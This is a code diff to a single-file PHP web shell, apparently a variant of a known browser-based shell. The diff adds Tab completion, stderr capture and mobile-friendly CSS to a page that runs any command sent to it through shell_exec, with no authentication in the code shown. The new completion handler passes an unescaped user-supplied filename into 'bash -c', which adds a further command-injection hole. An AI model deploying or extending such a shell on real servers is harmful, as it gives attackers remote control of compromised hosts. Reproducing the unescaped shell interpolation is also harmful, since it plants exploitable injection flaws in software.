@@ -5,9 +5,9 @@ function featureShell($cmd, $cwd) {
 
     if (preg_match("/^\s*cd\s*$/", $cmd)) {
         // pass
-    } elseif (preg_match("/^\s*cd\s+(.+)\s*$/", $cmd)) {
+    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
         chdir($cwd);
-        preg_match("/^\s*cd\s+(.+)\s*$/", $cmd, $match);
+        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
         chdir($match[1]);
     } else {
         chdir($cwd);
@@ -24,17 +24,37 @@ function featurePwd() {
     return array("cwd" => getcwd());
 }
 
+function featureHint($fileName, $cwd, $type) {
+    chdir($cwd);
+    if ($type == 'cmd') {
+        $cmd = "compgen -c $fileName";
+    } else {
+        $cmd = "compgen -f $fileName";
+    }
+    $cmd = "/bin/bash -c \"$cmd\"";
+    $files = explode("\n", shell_exec($cmd));
+    return array(
+        'files' => $files,
+    );
+}
+
 if (isset($_GET["feature"])) {
 
     $response = NULL;
 
     switch ($_GET["feature"]) {
         case "shell":
-            $response = featureShell($_POST["cmd"], $_POST["cwd"]);
+            $cmd = $_POST['cmd'];
+            if (!preg_match('/2>/', $cmd)) {
+                $cmd .= ' 2>&1';
+            }
+            $response = featureShell($cmd, $_POST["cwd"]);
             break;
         case "pwd":
             $response = featurePwd();
             break;
+        case "hint":
+            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
     }
 
     header("Content-Type: application/json");
@@ -65,6 +85,9 @@ if (isset($_GET["feature"])) {
                 margin: 50px auto 0 auto;
                 box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                 font-size: 10pt;
+                display: flex;
+                flex-direction: column;
+                align-items: stretch;
             }
 
             #shell-content {
@@ -72,12 +95,35 @@ if (isset($_GET["feature"])) {
                 overflow: auto;
                 padding: 5px;
                 white-space: pre-wrap;
+                flex-grow: 1;
             }
 
             #shell-logo {
                 font-weight: bold;
                 color: #FF4180;
                 text-align: center;
+            }
+
+            @media (max-width: 991px) {
+                #shell-logo {
+                    display: none;
+                }
+
+                html, body, #shell {
+                    height: 100%;
+                    width: 100%;
+                    max-width: none;
+                }
+
+                #shell {
+                    margin-top: 0;
+                }
+            }
+
+            @media (max-width: 767px) {
+                #shell-input {
+                    flex-direction: column;
+                }
             }
 
             .shell-prompt {
@@ -103,16 +149,24 @@ if (isset($_GET["feature"])) {
                 line-height: 30px;
             }
 
-            #shell-input > input {
-                flex-grow: 1;
+            #shell-input #shell-cmd {
                 height: 30px;
                 line-height: 30px;
-                padding: 0 5px;
                 border: none;
                 background: transparent;
                 color: #eee;
                 font-family: monospace;
                 font-size: 10pt;
+                width: 100%;
+                align-self: center;
+            }
+
+            #shell-input div {
+                flex-grow: 1;
+                align-items: stretch;
+            }
+
+            #shell-input input {
                 outline: none;
             }
         </style>
@@ -124,26 +178,61 @@ if (isset($_GET["feature"])) {
             var eShellCmdInput = null;
             var eShellContent = null;
 
+            function _insertCommand(command) {
+                eShellContent.innerHTML += "\n\n";
+                eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
+                eShellContent.innerHTML += escapeHtml(command);
+                eShellContent.innerHTML += "\n";
+                eShellContent.scrollTop = eShellContent.scrollHeight;
+            }
+
+            function _insertStdout(stdout) {
+                eShellContent.innerHTML += escapeHtml(stdout);
+                eShellContent.scrollTop = eShellContent.scrollHeight;
+            }
+
             function featureShell(command) {
-
-                function _insertCommand(command) {
-                    eShellContent.innerHTML += "\n\n";
-                    eShellContent.innerHTML += "<span class=\"shell-prompt\">" + genPrompt(CWD) + "</span> ";
-                    eShellContent.innerHTML += escapeHtml(command);
-                    eShellContent.innerHTML += "\n";
-                    eShellContent.scrollTop = eShellContent.scrollHeight;
-                }
-
-                function _insertStdout(stdout) {
-                    eShellContent.innerHTML += escapeHtml(stdout);
-                    eShellContent.scrollTop = eShellContent.scrollHeight;
-                }
 
                 _insertCommand(command);
                 makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function(response) {
                     _insertStdout(response.stdout.join("\n"));
                     updateCwd(response.cwd);
                 });
+            }
+
+            function featureHint() {
+                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete
+
+                function _requestCallback(data) {
+                    if (data.files.length <= 1) return;  // no completion
+
+                    if (data.files.length === 2) {
+                        if (type === 'cmd') {
+                            eShellCmdInput.value = data.files[0];
+                        } else {
+                            var currentValue = eShellCmdInput.value;
+                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
+                        }
+                    } else {
+                        _insertCommand(eShellCmdInput.value);
+                        _insertStdout(data.files.join("\n"));
+                    }
+                }
+
+                var currentCmd = eShellCmdInput.value.split(" ");
+                var type = (currentCmd.length === 1) ? "cmd" : "file";
+                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];
+
+                makeRequest(
+                    "?feature=hint",
+                    {
+                        filename: fileName,
+                        cwd: CWD,
+                        type: type
+                    },
+                    _requestCallback
+                );
+
             }
 
             function genPrompt(cwd) {
@@ -209,8 +298,9 @@ if (isset($_GET["feature"])) {
                             eShellCmdInput.value = commandHistory[historyPosition];
                         }
                         break;
-                    case "Tab":
+                    case 'Tab':
                         event.preventDefault();
+                        featureHint();
                         break;
                 }
             }
@@ -269,7 +359,9 @@ if (isset($_GET["feature"])) {
             </pre>
             <div id="shell-input">
                 <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
-                <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
+                <div>
+                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
+                </div>
             </div>
         </div>
     </body>
